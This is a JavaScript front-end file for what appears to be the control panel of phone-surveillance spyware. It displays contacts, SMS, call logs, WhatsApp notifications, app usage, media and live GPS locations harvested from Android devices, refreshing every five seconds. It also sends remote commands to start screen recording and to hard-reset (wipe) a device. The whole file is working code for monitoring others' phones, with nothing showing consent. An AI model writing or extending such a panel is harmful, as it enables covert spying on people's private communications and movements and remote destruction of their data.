// public/main.js (corrigido)
const api = {
  post: async (path, body, token) => {
    const headers = { 'Content-Type': 'application/json' };
    if (token) headers.Authorization = 'Bearer ' + token;
    const res = await fetch(path, {
      method: 'POST',
      headers,
      body: JSON.stringify(body)
    });
    // tenta parsear JSON, se falhar devolve object vazio para evitar throw
    return res.json().catch(() => ({}));
  },
  get: async (path, token) => {
    const headers = {};
    if (token) headers.Authorization = 'Bearer ' + token;
    const res = await fetch(path, { headers });
    if (!res.ok) return [];
    return res.json().catch(() => []);
  }
};

const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
  const lb = document.getElementById('loginBox');
  const ub = document.getElementById('userBox');
  if (lb) lb.classList.add('hidden');
  if (ub) ub.classList.remove('hidden');
  const uname = document.getElementById('userName');
  if (uname) uname.innerText = user.username || '';
  showPanel('devices');
  refreshAll();
}

function logout() {
  localStorage.removeItem(tokenKey);
  localStorage.removeItem(userKey);
  location.reload();
}

function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  if (!u || !p) {
    document.getElementById('loginMsg').innerText = 'Preencha usuário e senha';
    return;
  }
  const r = await api.post('/api/auth/login', { username: u, password: p });
  if (r && r.token) {
    setLoggedIn(r.user || { username: u }, r.token);
    document.getElementById('loginMsg').innerText = '';
  } else {
    document.getElementById('loginMsg').innerText = r.error || 'Login failed';
  }
});

document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  if (!u || !p) {
    document.getElementById('loginMsg').innerText = 'Preencha usuário e senha';
    return;
  }
  const r = await api.post('/api/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = (r && r.ok) ? 'Registered. Faça login.' : (r.error || 'Register failed');
});

document.getElementById('btnLogout').addEventListener('click', logout);

// menu buttons
document.querySelectorAll('.menu-btn').forEach(b => {
  b.addEventListener('click', () => {
    const t = b.getAttribute('data-target');
    showPanel(t);
  });
});

function hideAllPanels() {
  document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
}
function showPanel(name) {
  hideAllPanels();
  const mapId = {
    contacts: 'contactsPanel',
    sms: 'smsPanel',
    calls: 'callsPanel',
    notifs: 'notifsPanel',
    location: 'locationPanel',
    usage: 'usagePanel',
    media: 'mediaPanel',
    devices: 'devicesPanel'
  }[name];
  if (mapId) document.getElementById(mapId).classList.remove('hidden');
}

/* ---------- RENDERERS ---------- */

async function renderContacts() {
  const token = getToken();
  const q = document.getElementById('contactsQuery').value || '';
  try {
    const data = await api.get('/api/contacts?q=' + encodeURIComponent(q) + '&limit=200', token);
    const ul = document.getElementById('contactsList'); ul.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhum contacto</li>'; return; }
    data.forEach(c => {
      const li = document.createElement('li');
      li.innerHTML = `<div><strong>${escapeHtml(c.name || '(sem nome)')}</strong><div style="color:#666">${escapeHtml(c.number || '')}</div></div>`;
      ul.appendChild(li);
    });
  } catch (e) {
    console.error('renderContacts', e);
    document.getElementById('contactsList').innerHTML = '<li>Erro ao carregar contactos</li>';
  }
}

document.getElementById('btnSearchContacts').addEventListener('click', renderContacts);

async function renderSms() {
  const token = getToken();
  try {
    const data = await api.get('/api/sms', token);
    const ul = document.getElementById('smsList'); ul.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhum SMS</li>'; return; }
    data.forEach(s => {
      const li = document.createElement('li');
      li.innerHTML = `<div><strong>${escapeHtml(s.sender || '')}</strong>: ${escapeHtml(s.message || '')}</div><div style="color:#666">${new Date(s.timestamp || Date.now()).toLocaleString()}</div>`;
      ul.appendChild(li);
    });
  } catch (e) {
    console.error('renderSms', e);
    document.getElementById('smsList').innerHTML = '<li>Erro ao carregar SMS</li>';
  }
}

async function renderCalls() {
  const token = getToken();
  try {
    const data = await api.get('/api/call', token);
    const ul = document.getElementById('callsList'); ul.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhuma chamada</li>'; return; }
    data.forEach(c => {
      const li = document.createElement('li');
      const num = c.number || '(unknown)';
      const dur = c.duration ? Math.round(c.duration / 1000) + 's' : '-';
      li.innerHTML = `<div><strong>${escapeHtml(num)}</strong><div style="color:#666">${escapeHtml(c.state || '')} • ${dur}</div></div><div style="color:#666">${new Date(c.timestamp || Date.now()).toLocaleString()}</div>`;
      ul.appendChild(li);
    });
  } catch (e) {
    console.error('renderCalls', e);
    document.getElementById('callsList').innerHTML = '<li>Erro ao carregar chamadas</li>';
  }
}

async function renderNotifs() {
  const token = getToken();
  try {
    const data = await api.get('/api/whatsapp', token);
    const ul = document.getElementById('notifList'); ul.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhuma notificação</li>'; return; }
    data.forEach(n => {
      const li = document.createElement('li');
      li.innerHTML = `<div><strong>${escapeHtml(n.packageName || '')}</strong>: ${escapeHtml(n.message || '')}</div><div style="color:#666">${new Date(n.timestamp || Date.now()).toLocaleString()}</div>`;
      ul.appendChild(li);
    });
  } catch (e) {
    console.error('renderNotifs', e);
    document.getElementById('notifList').innerHTML = '<li>Erro ao carregar notificações</li>';
  }
}

async function renderUsage() {
  const token = getToken();
  try {
    const data = await api.get('/api/app-usage', token);
    const ul = document.getElementById('usageList'); ul.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhum uso</li>'; return; }
    data.forEach(u => {
      const li = document.createElement('li');
      li.innerHTML = `<div>${escapeHtml(u.packageName || '')} <div style="color:#666">${u.totalTime || 0}ms</div></div>`;
      ul.appendChild(li);
    });
  } catch (e) {
    console.error('renderUsage', e);
    document.getElementById('usageList').innerHTML = '<li>Erro ao carregar uso</li>';
  }
}

async function renderMedia() {
  const token = getToken();
  try {
    const data = await api.get('/api/media', token);
    const ul = document.getElementById('mediaList'); ul.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { ul.innerHTML = '<li>Nenhuma media</li>'; return; }
    data.forEach(m => {
      const li = document.createElement('li');
      const dl = document.createElement('button');
      dl.textContent = 'Download';
      dl.onclick = async () => {
        const token = getToken();
        const res = await fetch('/api/media/' + m._id, { headers: { Authorization: 'Bearer ' + token } });
        if (!res.ok) return alert('Download failed');
        const blob = await res.blob();
        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = m.filename || m._id; document.body.appendChild(a); a.click(); a.remove();
      };
      li.innerHTML = `<div><strong>${escapeHtml(m.filename || m._id)}</strong><div style="color:#666">${m.metadata ? escapeHtml(JSON.stringify(m.metadata)) : ''}</div></div>`;
      li.appendChild(dl);
      ul.appendChild(li);
    });
  } catch (e) {
    console.error('renderMedia', e);
    document.getElementById('mediaList').innerHTML = '<li>Erro ao carregar media</li>';
  }
}

async function renderDevices() {
  const token = getToken();
  try {
    const data = await api.get('/api/devices', token);
    const div = document.getElementById('devicesList'); div.innerHTML = '';
    if (!Array.isArray(data) || data.length === 0) { div.innerHTML = 'Nenhum dispositivo'; return; }
    data.forEach(d => {
      const el = document.createElement('div');
      el.style.display = 'flex'; el.style.justifyContent = 'space-between'; el.style.padding = '6px 0'; el.style.borderBottom = '1px solid #eee';
      const left = document.createElement('div');
      left.innerHTML = `<strong>${escapeHtml(d.label || d.deviceId || d.androidId || '(dispositivo)')}</strong><div style="color:#666">${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'never'}</div>`;
      const right = document.createElement('div');
      const dot = document.createElement('span'); dot.textContent = '●';
      dot.style.color = (d.lastSeen && (Date.now() - new Date(d.lastSeen).getTime()) < 120000) ? 'green' : 'red';
      dot.style.marginRight = '8px';
      right.appendChild(dot);

      const hr = document.createElement('button'); hr.textContent = 'Hard Reset';
      hr.onclick = async () => {
        if (!confirm('Confirm hard reset?')) return;
        const token = getToken();
        const res = await api.post('/api/device/' + encodeURIComponent(d.deviceId || d.androidId || '' ) + '/command', { command: 'HARD_RESET' }, token);
        alert(res && res.ok ? 'Sent' : 'Failed');
      };
      right.appendChild(hr);

      const startSR = document.createElement('button'); startSR.textContent = 'Start ScreenRec';
      startSR.onclick = async () => {
        const token = getToken();
        const res = await api.post('/api/device/' + encodeURIComponent(d.deviceId || d.androidId || '') + '/command', { command: 'START_SCREEN_RECORD' }, token);
        alert(res && res.ok ? 'Sent' : 'Failed');
      };
      right.appendChild(startSR);

      el.appendChild(left); el.appendChild(right);
      div.appendChild(el);
    });
  } catch (e) {
    console.error('renderDevices', e);
    document.getElementById('devicesList').innerHTML = 'Erro ao listar dispositivos';
  }
}

/* ---------- MAP ---------- */
let map, markersLayer;

function initMap() {
  if (map) return;
  map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
  markersLayer = L.layerGroup().addTo(map);
}

async function renderMap() {
  initMap();
  const token = getToken();
  const deviceIdInput = document.getElementById('mapDeviceId').value || undefined;
  const query = deviceIdInput ? ('?deviceId=' + encodeURIComponent(deviceIdInput)) : '';
  try {
    const data = await api.get('/api/location' + query, token);
    markersLayer.clearLayers();
    if (!Array.isArray(data) || data.length === 0) return;
    // show newest first: backend returns sorted by timestamp desc in our routes — we center on most recent
    let mostRecent = null;
    for (let i = 0; i < data.length; i++) {
      const pt = data[i];
      if (typeof pt.lat !== 'number' && typeof pt.lon !== 'number') continue;
      const lat = Number(pt.lat);
      const lon = Number(pt.lon);
      const acc = pt.accuracy !== undefined ? pt.accuracy : '';
      const ts = pt.timestamp || pt.createdAt || Date.now();
      const popupHtml = `<div style="font-size:13px">
        <div><strong>Lat:</strong> ${lat.toFixed(6)}</div>
        <div><strong>Lon:</strong> ${lon.toFixed(6)}</div>
        <div><strong>Accuracy:</strong> ${escapeHtml(String(acc))}</div>
        <div><strong>Data/Hora:</strong> ${new Date(ts).toLocaleString()}</div>
      </div>`;
      const marker = L.marker([lat, lon]).bindPopup(popupHtml);
      markersLayer.addLayer(marker);
      if (!mostRecent) mostRecent = { lat, lon, marker };
    }
    if (mostRecent) {
      map.setView([mostRecent.lat, mostRecent.lon], 13);
      mostRecent.marker.openPopup();
    }
  } catch (e) {
    console.error('renderMap', e);
    alert('Erro ao carregar mapa: ' + (e.message || e));
  }
}

document.getElementById('btnReloadMap').addEventListener('click', renderMap);

/* ---------- REFRESH ---------- */
async function refreshAll() {
  await Promise.allSettled([
    renderContacts(),
    renderSms(),
    renderCalls(),
    renderNotifs(),
    renderUsage(),
    renderMedia(),
    renderDevices(),
    renderMap()
  ]);
}

// auto refresh every 5s only if token present
setInterval(() => { if (getToken()) refreshAll(); }, 5000);

// init on load
window.addEventListener('load', () => {
  const token = getToken();
  if (token) {
    const user = getUser();
    const lb = document.getElementById('loginBox');
    const ub = document.getElementById('userBox');
    if (lb) lb.classList.add('hidden');
    if (ub) ub.classList.remove('hidden');
    const uname = document.getElementById('userName');
    if (uname) uname.innerText = user ? user.username : '';
    refreshAll();
  }
});

/* ---------- UTIL ---------- */
function escapeHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s).replace(/[&<>"']/g, (m) => {
    return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[m];
  });
                                                        }
